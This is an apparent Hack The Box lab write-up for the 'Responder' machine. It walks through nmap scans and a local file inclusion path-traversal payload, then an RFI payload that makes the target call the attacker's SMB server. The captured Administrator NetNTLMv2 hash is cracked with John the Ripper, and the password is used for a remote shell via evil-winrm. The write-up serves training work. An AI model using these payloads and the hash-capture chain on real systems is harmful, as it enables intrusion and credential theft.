# Responder
![hackthebox_logo](https://user-images.githubusercontent.com/83867734/141313996-2c2024f2-3775-4bfb-9809-5d51005379c3.png)

This exercise simulates an attack by using Responder.

Machines
--
Attacker:
* Name: attacker_machine
* Operating System: Kali Linux
* IP Address: 10.10.15.185

Victim:
* Name: victim_machine
* IP Address: 10.129.243.249
* Other information must be gathered during the attack

## Phase 1: Enumeration

$ sudo nmap -sC 10.129.243.249 -p- -g 53 -f
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 11:06 EDT
Nmap scan report for unika.htb (10.129.243.249)
Host is up (0.043s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT     STATE SERVICE
80/tcp   open  http
|_http-title: Unika
5985/tcp open  wsman

$ sudo nmap -sC -sV 10.129.243.249 -p 5985 -g 53 -f
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-29 11:10 EDT
Nmap scan report for unika.htb (10.129.243.249)
Host is up (0.040s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

## Phase 2: Foothold

If you access to `10.129.243.249` by the browser, you will be redirected to `unika.htb`. Add to `/etc/hosts` the following row:
```
10.129.243.249 unika.htb
```
Now visit by the browser `http://unika.htb`. By exploring the website, you can note a section related languages that is `http://unika.htb/index.php?page=`. By performing some checks, it is vulnerable to local file inclusion:
```
http://unika.htb/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```
and remote file inclusion (that we'll use later).

Now what we are going to do here is we are going to capture the NTLM (New Technology LAN Manager) hash of our administrator using a tool called `Responder`.

As described by HTB writeup, Responder can do many different kinds of attacks, but for this scenario, it will set up a malicious SMB server. When the target machine attempts to perform the NTLM authentication to that server, the Responder sends a challenge back for the server to encrypt with the user's password. When the server responds, the Responder will use the challenge and the encrypted response to generate the NetNTLMv2. While we can't reverse the NetNTLMv2, we can try many different common passwords to see if any generate the same challenge-response, and if we find one, we know that is the password. This is often referred to as hash cracking, which we'll do with a program called John The Ripper.

Run:
```
responder -I tun0
```
In this way we set a malicious SMB server.

Now we should force the victim machine to call our malicious SMB server. We can do it by exploiting the remote file inclusion vulnerability by visiting on the browser:
```
http://unika.htb/index.php?page=//10.10.15.185/test
```
If we move to the terminal of Responder, we can see the NTLMv2-SSP Hash related to the Administrator account. Let's use John for cracking it:
```
echo -n "Administrator::RESPONDER:63ef0deb8f62d005:FB8D22675A42B66A6537051B4B851C87:010100000000000080F4980A4A73D801393BD58C3B2EACB300000000020008004A0039004700310001001E00570049004E002D004A00420037003400430046003000370037004400540004003400570049004E002D004A0042003700340043004600300037003700440054002E004A003900470031002E004C004F00430041004C00030014004A003900470031002E004C004F00430041004C00050014004A003900470031002E004C004F00430041004C000700080080F4980A4A73D801060004000200000008003000300000000000000001000000002000007DD95283C48454D4F3B969D82F6C9E82B70262BBC1945F7B036A96A4B2EBFE980A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E003100380035000000000000000000" > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
We get immediately the password of Administrator. Now we need to access to it. By the previous Nmap scan, we have `5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)` so we can use `evil-winrm`:
```
evil-winrm -i 10.129.243.249 -u administrator -p badminton
```
A PowerShell instance is run. We can find the flag in `C:\Users\mike\Desktop` folder.